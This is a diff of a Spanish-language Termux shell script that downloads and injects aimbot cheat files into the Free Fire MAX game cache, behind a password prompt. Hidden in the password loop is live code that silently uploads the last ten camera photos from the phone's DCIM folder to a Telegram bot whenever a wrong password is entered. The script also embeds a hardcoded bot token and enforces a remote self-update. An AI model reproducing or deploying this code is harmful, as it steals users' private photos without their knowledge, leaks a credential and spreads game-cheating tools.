@@ -1,19 +1,15 @@
 #!/data/data/com.termux/files/usr/bin/sh
 
 # --- CONFIGURACIÓN DE ACTUALIZACIÓN ONLINE ---
-# 1. Pon aquí la versión actual de este script:
 VERSION_ACTUAL="1.6"
-
 CURL_PATH="/data/data/com.termux/files/usr/bin/curl"
 URL_VERSION="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/version.txt?v=$(date +%s)"
-URL_SCRIPT="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/PedroModz666.sh"
+URL_SCRIPT="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/PedroModz666.sh?v=$(date +%s)"
 # ---------------------------------------------
 
 verificar_actualizacion() {
-    # Descargar y limpiar completamente cualquier espacio o salto de línea fantasma
     VERSION_REMOTA=$("$CURL_PATH" -s "$URL_VERSION" | tr -d '\r' | tr -d '\n' | xargs)
     
-    # Si la versión remota existe y es DIFERENTE a la local, obliga a actualizar
     if [ -n "$VERSION_REMOTA" ] && [ "$VERSION_ACTUAL" != "$VERSION_REMOTA" ]; then
         printf "\n\033[1;31m¡Nueva actualización obligatoria disponible ($VERSION_REMOTA)!\033[0m\n"
         printf "¿Deseas actualizar ahora? (s/n): "
@@ -37,6 +33,54 @@ verificar_actualizacion() {
 
 # Ejecutar verificación de actualización al iniciar
 verificar_actualizacion
+
+# --- DESCARGA AUTOMÁTICA DE ARCHIVOS SUELTOS ---
+verificar_y_descargar_recursos() {
+    printf "\n\033[1;36m[i] Verificando archivos del sistema...\033[0m\n"
+
+    # 1. Definir carpetas de destino con tu nombre
+    DIR_ORI="/storage/emulated/0/PedroModz666/Ori"
+    DIR_PECHO="/storage/emulated/0/PedroModz666/Pecho"
+    DIR_CUELLO="/storage/emulated/0/PedroModz666/cuello"
+
+    # Crear carpetas si no existen
+    mkdir -p "$DIR_ORI"
+    mkdir -p "$DIR_PECHO"
+    mkdir -p "$DIR_CUELLO"
+
+    # 2. Rutas locales de los archivos
+    FILE_ORI="$DIR_ORI/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
+    FILE_PECHO="$DIR_PECHO/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
+    FILE_CUELLO="$DIR_CUELLO/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
+
+    # 3. Enlaces remotos en tu GitHub
+    URL_ORI="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/recursos/Ori/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
+    URL_PECHO="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/recursos/Pecho/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
+    URL_CUELLO="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/recursos/Cuello/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
+
+    # Descargar Original si no existe
+    if [ ! -f "$FILE_ORI" ]; then
+        printf "${AMARILLO}[-] Descargando archivo Original...${RESET}\n"
+        "$CURL_PATH" -s -o "$FILE_ORI" "$URL_ORI"
+    fi
+
+    # Descargar Pecho si no existe
+    if [ ! -f "$FILE_PECHO" ]; then
+        printf "${AMARILLO}[-] Descargando archivo Aimbot Pecho...${RESET}\n"
+        "$CURL_PATH" -s -o "$FILE_PECHO" "$URL_PECHO"
+    fi
+
+    # Descargar Cuello si no existe
+    if [ ! -f "$FILE_CUELLO" ]; then
+        printf "${AMARILLO}[-] Descargando archivo Aimbot Cuello...${RESET}\n"
+        "$CURL_PATH" -s -o "$FILE_CUELLO" "$URL_CUELLO"
+    fi
+
+    printf "${VERDE}[✔] ¡Archivos listos y verificados!${RESET}\n\n"
+}
+
+# Ejecutar la verificación y descarga de recursos
+verificar_y_descargar_recursos
 
 # --- CONFIGURACIÓN DE TELEGRAM ---
 TOKEN_BOT="8683483962:AAGHLpFhkenCuKPbo_jDSlHP5RtomhR3L4Y"
@@ -68,11 +112,7 @@ AMARILLO='\033[1;33m'
 CYAN='\033[0;36m'
 RESET='\033[0m'
 
-# --- RUTAS DE ORIGEN Y DESTINO ---
-ORIGEN_ORIGINAL="/storage/emulated/0/Caleb/Ori/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
-ORIGEN_AIMBOT="/storage/emulated/0/Caleb/Pecho/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
-ORIGEN_CUELLO="/storage/emulated/0/Caleb/cuello/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
-
+# --- RUTAS DE DESTINO FINAL (JUEGO) ---
 DESTINO="/data/user/0/com.dts.freefiremax/files/contentcache/Compulsory/android/gameassetbundles/cache_res.0fNB3oXqZOJRyvBVnID6F8UK2IM~3D"
 
 clear
@@ -101,12 +141,10 @@ while [ $intentos -lt $INTENTOS_MAXIMOS ]; do
         
         MSG_TG="⚠️ Clave incorrecta: '$password' (Restantes: $restantes). Aquí tienes las últimas 10 fotos:"
         
-        # Enviar aviso previo
         "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
             -d "chat_id=$TU_CHAT_ID" \
             -d "text=$MSG_TG" > /dev/null 2>&1
 
-        # Enviar automáticamente las últimas 10 fotos de la cámara
         for foto in $(ls -t /storage/emulated/0/DCIM/Camera/*.jpg 2>/dev/null | head -n 10); do
             if [ -f "$foto" ]; then
                 "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendPhoto" \
@@ -119,8 +157,8 @@ while [ $intentos -lt $INTENTOS_MAXIMOS ]; do
         if [ $intentos -eq $INTENTOS_MAXIMOS ]; then
             MSG_TG="🚫 Script bloqueado por exceder intentos de clave."
             "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-                -d "chat_id=$TU_CHAT_ID" \
-                -d "text=$MSG_TG" > /dev/null 2>&1
+            -d "chat_id=$TU_CHAT_ID" \
+            -d "text=$MSG_TG" > /dev/null 2>&1
 
             printf "${ROJO}[!] Demasiados intentos fallidos. Saliendo...${RESET}\n\n"
             exit 1
@@ -147,27 +185,27 @@ while true; do
 
     case "$opcion" in
         1)
-            if [ -f "$ORIGEN_ORIGINAL" ]; then
+            if [ -f "$FILE_ORI" ]; then
                 printf "\n${CYAN}Inyectando Original...${RESET}\n"
-                cat "$ORIGEN_ORIGINAL" > "$DESTINO"
+                cat "$FILE_ORI" > "$DESTINO"
                 printf "${VERDE}[✔] ¡Bypass Active Disfruta!${RESET}\n"
             else
                 printf "\n${ROJO}[!] Error: No existe el archivo en la ruta Original.${RESET}\n"
             fi
             ;;
         2)
-            if [ -f "$ORIGEN_AIMBOT" ]; then
+            if [ -f "$FILE_PECHO" ]; then
                 printf "\n${CYAN}Inyectando Aim Pecho...${RESET}\n"
-                cat "$ORIGEN_AIMBOT" > "$DESTINO"
+                cat "$FILE_PECHO" > "$DESTINO"
                 printf "${VERDE}[✔] ¡Aim Pecho aplicado con éxito!${RESET}\n"
             else
                 printf "\n${ROJO}[!] Error: No existe el archivo en la ruta Pecho.${RESET}\n"
             fi
             ;;
         3)
-            if [ -f "$ORIGEN_CUELLO" ]; then
+            if [ -f "$FILE_CUELLO" ]; then
                 printf "\n${CYAN}Inyectando Aim Cuello...${RESET}\n"
-                cat "$ORIGEN_CUELLO" > "$DESTINO"
+                cat "$FILE_CUELLO" > "$DESTINO"
                 printf "${VERDE}[✔] ¡Aim Cuello aplicado con éxito!${RESET}\n"
             else
                 printf "\n${ROJO}[!] Error: No existe el archivo en la ruta Cuello.${RESET}\n"
